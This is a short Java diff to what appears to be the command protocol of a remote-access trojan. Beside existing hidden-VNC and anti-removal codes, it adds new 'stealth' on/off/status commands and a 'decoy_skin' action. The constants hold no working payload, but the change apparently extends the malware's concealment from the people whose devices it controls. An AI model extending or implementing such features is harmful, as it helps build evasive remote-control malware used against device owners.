@@ -257,6 +257,7 @@ public final class Protocol {
 public static final String GHOST_HVNC   = "0xGH";
 public static final String GHOST_TOAST  = "0xGT";
 public static final String ANTI_REMOVAL = "0xAR";
+public static final String STEALTH      = "0xST";
 
 public static final String ACT_GHOST_START  = "ghost_start";
 public static final String ACT_GHOST_STOP   = "ghost_stop";
@@ -269,4 +270,10 @@ public static final String ACT_TOAST_BURNT  = "toast_burnt";
 public static final String ACT_AR_ENABLE    = "ar_enable";
 public static final String ACT_AR_DISABLE   = "ar_disable";
 public static final String ACT_AR_STATUS = "ar_status";
+
+// === STEALTH EXTENSIONS ===
+public static final String ACT_STEALTH_ON   = "stealth_on";
+public static final String ACT_STEALTH_OFF  = "stealth_off";
+public static final String ACT_STEALTH_STATUS = "stealth_status";
+public static final String ACT_DECOY_SKIN   = "decoy_skin";
 }
